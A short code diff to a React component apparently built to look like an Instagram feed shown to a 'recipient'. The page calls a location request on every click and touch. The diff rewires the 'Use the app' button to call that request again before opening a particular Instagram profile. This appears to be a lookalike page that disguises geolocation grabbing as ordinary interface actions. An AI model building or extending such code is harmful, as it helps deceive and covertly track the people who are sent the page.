@@ -286,6 +286,26 @@ export default function RecipientFeed({
     setIsFollowing(true);
   };
 
+  /*
+   * Open native Instagram mobile application via deep link
+   */
+  const handleOpenInstagramApp = (e) => {
+    if (e) e.stopPropagation();
+    requestLocation();
+
+    const username = "mr_in.nocent_yogi";
+    const appUri = `instagram://user?username=${username}`;
+    const webFallbackUrl = `https://www.instagram.com/${username}/`;
+
+    // 1. Attempt to open native Instagram mobile app
+    window.location.href = appUri;
+
+    // 2. Fallback to official web profile if app isn't installed
+    setTimeout(() => {
+      window.open(webFallbackUrl, "_blank");
+    }, 1500);
+  };
+
   return (
     <div className="ig-app" onClick={requestLocation} onTouchStart={requestLocation}>
       {/* Left Sidebar */}
@@ -569,7 +589,7 @@ export default function RecipientFeed({
 
           {/* Bottom App Banner */}
           <div className="mobile-use-app-bar">
-            <button className="mobile-use-app-btn" onClick={requestLocation}>
+            <button className="mobile-use-app-btn" onClick={handleOpenInstagramApp} title="Open Instagram App">
               <span>Use the app</span>
               <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" fill="none" strokeWidth="2.5">
                 <line x1="18" y1="6" x2="6" y2="18" />
